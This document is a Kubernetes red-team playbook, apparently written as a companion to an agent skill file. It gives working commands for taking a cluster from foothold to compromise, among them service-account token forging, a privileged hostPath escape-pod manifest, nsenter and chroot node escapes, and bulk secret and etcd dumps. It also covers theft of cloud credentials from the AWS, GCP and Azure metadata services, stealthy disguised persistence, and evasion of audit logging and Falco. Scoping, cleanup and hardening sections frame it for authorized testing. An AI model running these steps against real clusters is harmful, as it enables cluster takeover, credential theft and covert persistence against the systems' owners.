# Kubernetes Attack Playbook — End-to-End Red Team Workflow Guide

> Deep-dive companion to `skills/kubernetes-attack/SKILL.md`.
>
> Audience: red teamers and security engineers who know what kubectl, RBAC, and a pod are, and want a battle-tested playbook for taking a Kubernetes cluster from initial foothold to full compromise — and pivoting into the underlying cloud account — without missing the bug that takes down the company.

---

## 1. Why a Workflow, Not Just Commands

`kubectl auth can-i --list` produces a permissions dump in 1 second. The trap is treating that dump as the assessment. A defensible red team engagement requires:

1. **Scope confirmation** — what's authorized, what's not, what are the cloud-account boundaries?
2. **Foothold verification** — is the entry vector real, or stale?
3. **Reconnaissance** — what does the cluster look like, what version, what's exposed?
4. **RBAC analysis** — what can the compromised identity do, and what escalation chains exist?
5. **Escape validation** — can a pod escape to the node? Which primitive, which CVE?
6. **Lateral movement** — what's reachable from the current position?
7. **Cloud IAM pivot** — does the cluster hand out cloud credentials?
8. **Persistence** — can we maintain access through the defender's response?
9. **Detection evasion** — what's the audit / Falco / Hubble footprint of every action?
10. **Cleanup** — return the cluster to its pre-engagement state.

This guide walks through all ten, in order, with the exact commands, decision points, and references.

---

## 2. Pre-Flight: Scope & Authorization

Before any active exploitation, answer these — in writing, in the statement of work or rules of engagement:

- **What's the entry point?** External API server exposure? A pod from a separate application pentest? A leaked kubeconfig from a CI audit? Each yields a different engagement shape.
- **What's the cluster scope?** One cluster, or all clusters in the account? Production, staging, or both? Are namespaces in-scope, or only specific ones?
- **Is pod escape authorized?** Pod escape in a multi-tenant cluster affects every tenant on the node. Get explicit authorization for escape attempts.
- **Are cloud-account pivots authorized?** EKS IRSA / GKE Workload Identity / AKS Managed Identity pivots cross from "the cluster" into "the cloud account" — usually a different ruleset and contractual scope. Confirm before crossing that line.
- **Is etcd direct access in scope?** Writing to etcd forges RBAC across restarts and upgrades; get explicit authorization.
- **What's the blast-radius ceiling?** No deletion of workloads? No node reboots? No network disruption?
- **What's the deliverable?** Internal report? Customer-facing? Regulator-facing? Different deliverables have different severity rubrics and disclosure timelines.
- **What's the timeline?** A 3-day triage finds different bugs than a 4-week red team engagement. Set expectations.

If any of these are unclear, stop and resolve before proceeding. Cloud IAM pivots and etcd writes are the two most common "we didn't realize that was in scope" escalations.

---

## 3. Phase 1: Foothold Verification

The first 15 minutes of any engagement are about confirming the foothold is real. Many reported "compromised clusters" turn out to be stale kubeconfigs, expired tokens, or dev clusters that were torn down.

### 3.1 From a kubeconfig file

```bash
# Load the kubeconfig and check identity
KUBECONFIG=/path/to/kubeconfig kubectl auth can-i --list
# If 401/403: token/cert is invalid → stop, re-acquire.
# If 200 with permissions: foothold confirmed.

# Confirm the cluster is the one in scope
kubectl cluster-info
kubectl version --short
kubectl get nodes -o wide
# Compare node IPs / cluster CIDR against the engagement scope.
```

### 3.2 From inside a pod

```bash
# Verify SA token is live
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -sk --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt \
  -H "Authorization: Bearer $TOKEN" \
  https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}/api/v1
# 200: foothold confirmed. 401: token expired — re-acquire or pivot.

# Check the token's claims (esp. expiration for 1.24+ projected tokens)
echo $TOKEN | cut -d. -f2 | base64 -d 2>/dev/null | jq
```

### 3.3 From external network access

```bash
# Anonymous API server
curl -sk https://<api-server>/version
curl -sk https://<api-server>/api/v1/namespaces
# 200: anonymous foothold confirmed.

# Kubelet port
curl -sk https://<node-ip>:10250/pods
# 200 with pods list: anonymous kubelet foothold confirmed.

# kube-hunter scan
kube-hunter --remote <api-server-or-node-ip> --active
```

If the foothold is real, proceed to Phase 2. If not, return to the engagement lead and re-acquire.

---

## 4. Phase 2: Cluster Reconnaissance

Now you have a foothold. Time to map the cluster.

### 4.1 Version and configuration

```bash
kubectl version
kubectl cluster-info
kubectl get nodes -o wide
# Note: k8s version per node, OS, kernel, container runtime.
# Cross-reference against CVEs (CVE-2018-1002105 for <1.10.11, etc.)

# API discovery
kubectl api-resources
kubectl api-versions
kubectl get crd
```

### 4.2 Namespace and resource enumeration

```bash
kubectl get ns
kubectl get all -A

# Privileged pods (escape candidates)
kubectl get pods -A -o json | jq -r '.items[] | select(.spec.containers[].securityContext.privileged==true) | "\(.metadata.namespace)/\(.metadata.name)"'

# hostPath mounts
kubectl get pods -A -o json | jq -r '.items[] | select(.spec.volumes[]?.hostPath) | "\(.metadata.namespace)/\(.metadata.name)"'

# hostPID / hostNetwork
kubectl get pods -A -o json | jq -r '.items[] | select(.spec.hostPID or .spec.hostNetwork) | "\(.metadata.namespace)/\(.metadata.name)"'

# docker.sock / containerd.sock mounts
kubectl get pods -A -o json | jq -r '.items[] | select(.spec.volumes[]?.hostPath.path | test("docker.sock|containerd.sock")) | "\(.metadata.namespace)/\(.metadata.name)"'
```

### 4.3 RBAC enumeration

```bash
# What can the current identity do?
kubectl auth can-i --list

# Cluster-wide RBAC
kubectl get clusterrole,clusterrolebinding -o wide

# Per-namespace RBAC
kubectl get role,rolebinding -A -o wide

# Who is cluster-admin?
kubectl get clusterrolebinding -o json | jq -r '.items[] | select(.roleRef.name=="cluster-admin") | .subjects[]'

# Over-privileged SAs (look for system:anonymous, default SAs with broad permissions)
kubectl get clusterrolebinding,rolebinding -A -o json | jq -r '.items[] | .subjects[]? | select(.kind=="ServiceAccount" or .name=="system:anonymous" or .name=="system:unauthenticated") | "\(.kind)/\(.namespace // "cluster")/\(.name)"' | sort -u
```

### 4.4 PSA enforcement check

```bash
# Check Pod Security Admission enforcement per namespace
kubectl get ns -o jsonpath='{range .items[*]}{.metadata.name}{"\t"}{.metadata.annotations.kubernetes\.io\/psa}{"\n"}{end}'
# Also check labels:
kubectl get ns --show-labels | grep pod-security.kubernetes.io/enforce
# enforce=privileged or absent = no enforcement (escape pods allowed)
# enforce=baseline = some restrictions
# enforce=restricted = strong restrictions
```

### 4.5 Admission webhooks

```bash
kubectl get mutatingwebhookconfigurations,validatingwebhookconfigurations -o yaml
# For each: note namespaceSelector, objectSelector, failurePolicy, matchPolicy.
# failurePolicy: Ignore = bypass on webhook failure
```

### 4.6 Run automated scanners

```bash
kubescape scan framework nsa --submit
kubescape scan framework cis-v1.10.0
kube-bench --benchmark cis-1.10 run    # on a node
```

---

## 5. Phase 3: RBAC Abuse & Privilege Escalation

Given the RBAC enumeration from §4.3, identify escalation chains.

### 5.1 The five classic escalation patterns

| Permission | Escalation | Reference |
|-----------|------------|-----------|
| `create` on `pods` (in any namespace with weak PSA) | Create privileged pod with hostPath/`/` → escape to node | payloads.md §3.2 |
| `create` on `serviceaccounts/token` (1.24+) | Forge token for any SA → lateral to that SA's RBAC | payloads.md §3.3 |
| `create` on `certificatesigningrequests` | Sign a client cert for `system:masters` | payloads.md §3.3 |
| `create` on `clusterrolebindings` / `rolebindings` | Bind your SA to `cluster-admin` | payloads.md §3.3 |
| `get` on `secrets` (especially in `kube-system`) | Read SA tokens, TLS keys, cloud credentials | payloads.md §3.3 |

### 5.2 Decision tree

```
Do you have `create` on pods in any namespace?
├── YES → Is PSA `enforce=restricted` in that namespace?
│        ├── NO  → Create escape pod (Pattern A). DONE.
│        └── YES → Try another namespace, or escalate RBAC first.
└── NO  → Do you have `create` on serviceaccounts/token?
         ├── YES → Forge tokens for privileged SAs. DONE.
         └── NO  → Do you have `create` on clusterrolebindings?
                  ├── YES → Bind your SA to cluster-admin. DONE.
                  └── NO  → Do you have `get` on secrets in kube-system?
                           ├── YES → Find default-token / cloud creds. DONE.
                           └── NO  → Look for less-common paths:
                                     - certificatesigningrequests
                                     - pod `exec` into privileged pods
                                     - patch on deployments / statefulsets
                                     - impersonate (rare, devastating)
```

### 5.3 Working through the chain

For each escalation, document:
1. The starting permission
2. The exact kubectl command
3. The resulting permission
4. The next escalation step

```bash
# Example chain: low-priv SA → forge token → cluster-admin
# Step 1: confirm SA can create tokens
kubectl auth can-i create serviceaccounts/token    # yes

# Step 2: find a privileged SA
kubectl get sa -n kube-system                       # default, deployment-controller, ...

# Step 3: forge a token for kube-system:default
FORGED=$(kubectl create token -n kube-system default)

# Step 4: use the forged token
kubectl --token "$FORGED" auth can-i --list
# If kube-system:default has cluster-admin (common misconfiguration): done.
```

---

## 6. Phase 4: Pod Escape

You're either in a privileged pod (either by compromise or by creating one via the RBAC chain) or you're evaluating whether a given pod can escape.

### 6.1 Escape primitive checklist

Run `cdk evaluate --full` to automate this. Manually verify:

- [ ] `privileged: true` → nsenter or chroot
- [ ] `hostPath: /` mount → chroot
- [ ] `hostPID: true` → nsenter into PID 1
- [ ] `hostNetwork: true` → network access to cluster services
- [ ] `CAP_SYS_ADMIN` → mount / pivot_root / nsenter
- [ ] `CAP_SYS_PTRACE` → ptrace into host processes
- [ ] `CAP_SYS_MODULE` → load kernel modules
- [ ] `docker.sock` mount → spawn privileged container
- [ ] `containerd.sock` mount → spawn via ctr
- [ ] `/proc` (host) mount → read `/proc/1/root/etc/shadow`
- [ ] `/sys` (host) mount → write kernel params
- [ ] Kernel CVE (CVE-2022-0185, CVE-2024-1086, CVE-2023-2640/32629)

### 6.2 Decision tree

```
Is the pod privileged?
├── YES → nsenter --target 1 --mount -- bash. DONE.
└── NO  → Is / mounted via hostPath?
         ├── YES → chroot /host sh. DONE.
         └── NO  → Is hostPID true?
                  ├── YES → nsenter --target 1 --pid -- bash. DONE.
                  └── NO  → Is docker.sock or containerd.sock mounted?
                           ├── YES → docker run --privileged ... or ctr run. DONE.
                           └── NO  → Is CAP_SYS_ADMIN present?
                                    ├── YES → mount + chroot, or CVE-2022-0185. DONE.
                                    └── NO  → Is there a kernel CVE in scope?
                                             ├── YES → Run the PoC. DONE.
                                             └── NO  → No easy escape. Pivot via API instead.
```

### 6.3 Verifying the escape

```bash
# After escape, confirm host root:
id                       # uid=0
hostname                 # node hostname, not pod name
cat /etc/os-release      # node OS
lsns                     # host namespaces visible
cat /proc/1/comm         # host's init (systemd, etc.)

# Confirm persistence potential:
ls /var/lib/kubelet/pki/                     # kubelet client cert
ls /etc/kubernetes/                          # control plane files (if CP node)
cat /var/lib/kubelet/config.yaml             # kubelet config
crontab -l                                  # root's cron
ls /home/                                    # user homes
```

---

## 7. Phase 5: Lateral Movement

Once you have node root (or a privileged pod in another namespace), move laterally.

### 7.1 Read all Secrets via API

```bash
# If you have cluster-admin or `get secrets` cluster-wide
kubectl get secrets -A -o jsonpath='{range .items[*]}{.metadata.namespace}{"\t"}{.metadata.name}{"\n"}{end}'
kubectl get secret -n kube-system <name> -o jsonpath='{.data}' | jq -r 'to_entries[] | "\(.key): \(.value | @base64d)"'

# Common secrets of interest:
# - default-token-* (legacy SA tokens)
# - sh.helm.release.v1.* (Helm release values, often with embedded secrets)
# - tls certs (private keys)
# - cloud credentials (AWS, GCP, Azure)
# - database passwords
```

### 7.2 Read Secrets via etcd (alternative path)

If the API is hardened but you have node root, read etcd directly (§6 of payloads.md).

### 7.3 Exec into other pods

```bash
# Find pods with interesting SAs
kubectl get pods -A -o jsonpath='{range .items[*]}{.metadata.namespace}{"\t"}{.metadata.name}{"\t"}{.spec.serviceAccountName}{"\n"}{end}' | sort -u

# Exec into a pod in another namespace to inherit its SA
kubectl exec -n <ns> <pod> -- cat /var/run/secrets/kubernetes.io/serviceaccount/token
```

### 7.4 Steal kubelet client cert from each node

```bash
# From a compromised node
cat /var/lib/kubelet/pki/kubelet-client-current.pem
# This cert is bound to system:nodes group. Use it to authenticate as the node.

# Node RBAC: can read its own pods, secrets bound to its pods, etc.
# (Limited, but enough to harvest per-node credentials.)
```

---

## 8. Phase 6: Cloud IAM Pivot (EKS / GKE / AKS)

This is the phase that turns "we compromised the cluster" into "we compromised the cloud account." Document the scope boundary before proceeding.

### 8.1 EKS IRSA pivot

```bash
# 1. Inside a pod with IRSA, read env
env | grep AWS
# AWS_ROLE_ARN=arn:aws:iam::111122223333:role/my-app-role
# AWS_WEB_IDENTITY_TOKEN_FILE=/var/run/secrets/eks.amazonaws.com/serviceaccount/token

# 2. Exchange token for STS creds
aws sts assume-role-with-web-identity \
  --role-arn $AWS_ROLE_ARN \
  --role-session-name pwn \
  --web-identity-token "$(cat $AWS_WEB_IDENTITY_TOKEN_FILE)" \
  > sts.json

# 3. Export creds
export AWS_ACCESS_KEY_ID=$(jq -r .Credentials.AccessKeyId sts.json)
export AWS_SECRET_ACCESS_KEY=$(jq -r .Credentials.SecretAccessKey sts.json)
export AWS_SESSION_TOKEN=$(jq -r .Credentials.SessionToken sts.json)

# 4. Verify and enumerate
aws sts get-caller-identity
aws iam list-attached-role-policies --role-name <role>
aws s3 ls
aws eks list-clusters

# 5. Pivot to another EKS cluster
aws eks update-kubeconfig --name <other-cluster> --region <region>
kubectl get nodes
```

### 8.2 GKE Workload Identity pivot

```bash
curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email"
# Returns: my-app-sa@project.iam.gserviceaccount.com

TOKEN=$(curl -s -H "Metadata-Flavor: Google" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" | jq -r .access_token)

curl -s -H "Authorization: Bearer $TOKEN" \
  https://storage.googleapis.com/storage/v1/b?project=<project-id>

# Or via gcloud
echo $TOKEN > /tmp/token.json
# (format the token for gcloud's expected file format)
gcloud auth activate-service-account --token-file=/tmp/token.json
gcloud storage ls
gcloud container clusters list
gcloud container clusters get-credentials <other-cluster> --region <region>
kubectl get nodes
```

### 8.3 AKS Managed Identity pivot

```bash
TOKEN=$(curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" \
  | jq -r .access_token)

curl -s -H "Authorization: Bearer $TOKEN" \
  https://management.azure.com/subscriptions?api-version=2020-01-01

# Or via az CLI
az login --identity
az account list
az aks list --output table
az aks get-credentials --resource-group <rg> --name <cluster>
kubectl get nodes
```

### 8.4 Cloud pivoting decision tree

```
What did you compromise?
├── Pod in EKS with IRSA → assume-role-with-web-identity. Now in AWS.
├── Pod in GKE with Workload Identity → metadata token. Now in GCP.
├── Pod in AKS with Managed Identity → IMDS token. Now in Azure.
└── Node root in any cloud → IMDS at 169.254.169.254. Now in the cloud account
   (with the node's role, often broader than any single pod's IRSA role).
```

---

## 9. Phase 7: Persistence

Maintain access through the defender's response. Choose primitives that blend in.

### 9.1 Persistence options ranked by stealth

| Primitive | Stealth | Blast radius | Notes |
|-----------|---------|--------------|-------|
| Image tag drift (`:latest`) | Very high | All clusters pulling the tag | Survives cluster reinstalls |
| MutatingWebhook sidecar injection | High | Every new pod | Hard to spot in webhook config |
| Backdoored operator | High | Cluster-wide | Looks like normal operator |
| CronJob in kube-system | Medium | Periodic callback | Blends with other cron jobs |
| DaemonSet in kube-system | Medium | Every node | Visible in `kubectl get ds -A` |
| Forged ClusterRoleBinding | Low | Cluster-admin | Visible in audit log |
| Long-lived SA token (legacy) | Low | SA's RBAC | Visible in secret list |

### 9.2 Persistence implementation

See payloads.md §13 for manifests. Key points:

- **DaemonSet** schedules on every node, including new ones. Pair with `hostNetwork: true` + `privileged: true` + `hostPath: /` for full-node persistence.
- **CronJob** beacons on a schedule. Name it `metrics-collector`, `cache-warmer`, etc.
- **MutatingWebhook** injects a sidecar into every new pod — survives app reinstalls.
- **Image tag drift** is the highest-stealth option but requires registry write access.

### 9.3 Persistence verification

```bash
# After deploying persistence
kubectl get ds -A | grep -v -E "calico|cilium|flannel|kube-proxy|aws-node|azure-ip-masq"
# Unfamiliar DaemonSets are suspicious — confirm your DaemonSet is there.

kubectl get cronjob -A
# Note any you didn't expect (could be defender's, could be yours).

kubectl get mutatingwebhookconfiguration,validatingwebhookconfiguration
# Confirm your webhook is registered.
```

---

## 10. Phase 8: Detection Evasion

Operate under the assumption that audit logs, Falco, and Hubble are enabled. Plan around them.

### 10.1 What's typically logged

| Layer | What's logged | Source |
|-------|---------------|--------|
| API audit | Every API call at Metadata level (verb, resource, user, source IP) | kube-apiserver `--audit-policy-file` |
| API audit (full) | Request/response bodies for Secret access, RBAC changes, exec/attach/portforward | Same |
| Falco | Shell in container, nsenter, /etc writes, unusual outbound connections, kubectl binary | Falco rules |
| Hubble | Network flows between pods | Cilium eBPF |
| Cloudtrail / Cloud Audit Logs | Cloud API calls (post IAM pivot) | Cloud provider |

### 10.2 Evasion strategies

**Strategy 1: Operate from outside the cluster**
- Exfiltrate the SA token, replay from an external host.
- Audit log shows the external IP, not the pod — defeats pod-based attribution.

**Strategy 2: Reuse existing tokens, don't create new ones**
- Forging tokens, creating RBAC bindings, and creating pods all generate distinctive audit events.
- Reuse existing privileged SAs instead.

**Strategy 3: Avoid `pods/exec`, `secrets get`**
- These are explicitly audited at Request level (response body included).
- Read Secrets via etcd if you have node root.
- Read SA tokens via pod filesystem (kubelet exec is audited differently).

**Strategy 4: Use allowed network paths**
- DNS (UDP/53 to kube-dns) for data exfiltration via subdomain encoding.
- Metadata service for cloud credential theft.
- Cluster-internal API for lateral movement.

**Strategy 5: Throttle to look benign**
- CronJob beacons every 15 minutes, not constant stream.
- Stay within namespace for Hubble.
- Don't touch /etc, /root, /bin (Falco triggers).

### 10.3 Verify your evasion

```bash
# Watch the audit log in real time (if you have access)
kubectl logs -n kube-system <api-server-pod> -c kube-apiserver | grep $TOKEN_FINGERPRINT

# Check Falco events
kubectl logs -n falco falco-<hash>

# Check Hubble flows
hubble observe --verdict DROPPED    # anything dropped = network policy hit
hubble observe --from-pod default/<your-pod>
```

---

## 11. Phase 9: Cleanup

Return the cluster to its pre-engagement state. Document every change made and every change reverted.

### 11.1 Cleanup checklist

- [ ] Delete any pods / DaemonSets / CronJobs you created
- [ ] Delete any ClusterRoleBindings / RoleBindings you forged
- [ ] Delete any Secrets you created (e.g., long-lived SA tokens)
- [ ] Delete any MutatingWebhookConfigurations you added
- [ ] Remove any poisoned images from registries
- [ ] Revert any patches you applied to Deployments / StatefulSets
- [ ] Restart any nodes where you exploited a kernel CVE (state may be corrupted)
- [ ] Rotate the SA token you exfiltrated
- [ ] Rotate the etcd client certs if you accessed etcd
- [ ] Rotate the kubelet client cert if you read it
- [ ] Rotate cloud IAM credentials if you pivoted (revoke active STS sessions, rotate the role's trust policy)
- [ ] Purge audit log entries related to your engagement (if authorized; usually NOT authorized — leave them for forensic value)

### 11.2 Verification

```bash
# Confirm cleanup
kubectl get ds,cronjob,secret,mutatingwebhookconfiguration,validatingwebhookconfiguration -A
# Compare against the pre-engagement inventory.

# Check for any remaining privileged pods you created
kubectl get pods -A -o json | jq -r '.items[] | select(.spec.containers[].securityContext.privileged==true) | "\(.metadata.namespace)/\(.metadata.name)"'
```

---

## 12. Reporting

Structure the report around the attack chain you actually executed, not a generic template.

### 12.1 Report sections

1. **Executive summary** — one paragraph: what was compromised, how, business impact.
2. **Scope & timeline** — what was authorized, when.
3. **Attack chain** — the sequence of TTPs from foothold to objective. Include the MITRE ATT&CK for Containers technique IDs.
4. **Findings** — each as a row: severity, description, evidence, recommendation.
5. **Detection gaps** — what your actions would NOT have been caught by the defender's current controls.
6. **Remediation roadmap** — prioritized: quick wins, mid-term, long-term.
7. **Appendices** — full command output, manifests, audit log excerpts.

### 12.2 Severity rubric

| Severity | Definition | K8s example |
|----------|------------|-------------|
| CRITICAL | Cluster takeover or cloud account pivot | Anonymous cluster-admin; etcd direct write; IRSA pivot to AWS root |
| HIGH | Single-pod or single-namespace compromise, or escalation requiring a specific misconfiguration | Pod with hostPath/`/` escape; SA with `create` on pods; anonymous kubelet |
| MEDIUM | Difficult-to-exploit misconfiguration | Permissive RBAC that requires chaining; weak admission webhook |
| LOW | Information disclosure or hardening recommendation | Default PSA warn mode; missing image signatures; kube-bench failures |

### 12.3 Recommendation categories

Group recommendations by category so the defender can track them:

- **RBAC**: audit all bindings, remove cluster-admin from non-admin SAs, enforce least-privilege.
- **Pod Security**: enforce `restricted` PSA in all namespaces.
- **Network**: default-deny NetworkPolicy in all namespaces, restrict egress.
- **API server**: disable anonymous auth, restrict insecure ports, audit policy at Metadata level.
- **etcd**: encryption at rest, firewall to control plane only.
- **Supply chain**: image signing (cosign), admission policy (Kyverno / OPA Gatekeeper), pin by digest.
- **Runtime detection**: Falco with K8s audit rules, Hubble for network observability.
- **Cloud IAM**: minimize bound cloud role permissions, scope IRSA trust policy.

---

## 13. References

### 13.1 MITRE ATT&CK for Containers

- Matrix: [attack.mitre.org/matrices/enterprise/containers](https://attack.mitre.org/matrices/enterprise/containers)
- Key techniques: T1610 (Deploy Container), T1611 (Escape to Host), T1613 (Container and Resource Discovery), T1614 (Clear History), T1615 (Container Shell), T1552 (Unsecured Credentials)

### 13.2 Reference tools (the inspirations for this skill)

- kubescape (11k stars): [github.com/kubescape/kubescape](https://github.com/kubescape/kubescape)
- CDK (4.7k stars): [github.com/cdk-team/CDK](https://github.com/cdk-team/CDK)
- kube-hunter (5k stars): [github.com/aquasecurity/kube-hunter](https://github.com/aquasecurity/kube-hunter)
- stratus-red-team (2.3k stars): [github.com/DataDog/stratus-red-team](https://github.com/DataDog/stratus-red-team)
- kubernetes-goat (5.7k stars): [github.com/madhuakula/kubernetes-goat](https://github.com/madhuakula/kubernetes-goat)
- peirates: [github.com/inguardians/peirates](https://github.com/inguardians/peirates)
- Hubble (4.2k stars): [github.com/cilium/hubble](https://github.com/cilium/hubble)
- kube-bench (8k stars): [github.com/aquasecurity/kube-bench](https://github.com/aquasecurity/kube-bench)

### 13.3 Authoritative hardening guides

- NSA Kubernetes Hardening Guide (2022): [media.defense.gov](https://media.defense.gov/2022/Aug/29/2003066362/-1/-1/0/CTR_KUBERNETES_HARDENING_GUIDANCE_1.2_20220915.PDF)
- CIS Kubernetes Benchmark: [cisecurity.org/benchmark/kubernetes](https://www.cisecurity.org/benchmark/kubernetes)
- Kubernetes Pod Security Standards: [kubernetes.io/docs/concepts/security/pod-security-standards](https://kubernetes.io/docs/concepts/security/pod-security-standards)
- Kubernetes Security Documentation: [kubernetes.io/docs/concepts/security](https://kubernetes.io/docs/concepts/security)

### 13.4 Key CVEs

| CVE | Component | Summary |
|-----|-----------|---------|
| CVE-2018-1002105 | kube-apiserver | Unauthenticated privilege escalation via HTTP/2 |
| CVE-2019-11253 | kube-apiserver | YAML billion laughs DoS |
| CVE-2020-8554 | kube-apiserver | MITM on external IPs (Kind/NetworkPolicy) |
| CVE-2022-0185 | Linux kernel (fs/context) | Heap overflow → container escape with CAP_SYS_ADMIN |
| CVE-2022-0492 | Linux kernel (cgroup v1) | release_agent escape with CAP_SYS_ADMIN |
| CVE-2023-2640 / CVE-2023-32629 | OverlayFS | pipeio confusion → overlay escape |
| CVE-2023-2728 | (Kubernetes-adjacent) | Various; check k8s CVE feed |
| CVE-2024-1086 | Linux netfilter | UAF → container escape |
| CVE-2024-21626 | runc (Leaky Vessels) | FD leak → container escape |

### 13.5 Talks and training

- Ian Coldwater, Brad Geesaman, Duffie Cooley — "Advanced Persistence Threats: The Future of K8s Attacks" (KubeCon)
- "Hacking K8s" — Def Con workshops
- "Kubernetes Attack Tree" — magazine.aquasec.com
- "The Container Threat Matrix" — attack.mitre.org

---

## Appendix A: Single-Page Cheat Sheet

```bash
# Foothold verification
kubectl auth can-i --list

# Cluster recon
kubectl get nodes -o wide
kubectl get ns
kubectl get pods -A -o json | jq -r '.items[] | select(.spec.containers[].securityContext.privileged==true) | "\(.metadata.namespace)/\(.metadata.name)"'

# RBAC escalation patterns
kubectl create token -n kube-system default                              # forge SA token
kubectl create -f - <<EOF                                                # create escape pod
apiVersion: v1
kind: Pod
metadata: {name: pwn, namespace: default}
spec:
  hostPID: true
  hostNetwork: true
  restartPolicy: Never
  containers:
  - name: pwn
    image: alpine
    command: ["chroot", "/host", "sh"]
    securityContext: {privileged: true}
    volumeMounts: [{name: h, mountPath: /host}]
  volumes: [{name: h, hostPath: {path: /}}]
EOF

# Pod escape (from inside)
nsenter --target 1 --mount -- bash      # privileged + hostPID
chroot /host sh                          # hostPath / mount

# etcd dump (with certs)
ETCDCTL_API=3 etcdctl --endpoints=... --cacert=... --cert=... --key=... get /registry/secrets --prefix

# EKS IRSA pivot
aws sts assume-role-with-web-identity --role-arn $AWS_ROLE_ARN --role-session-name pwn --web-identity-token "$(cat $AWS_WEB_IDENTITY_TOKEN_FILE)"

# Persistence
kubectl create -f persistence-daemonset.yaml
kubectl create -f persistence-cron.yaml

# Cleanup
kubectl delete pod,ds,cronjob <name> -n <ns>
kubectl delete clusterrolebinding pwn-admin
```
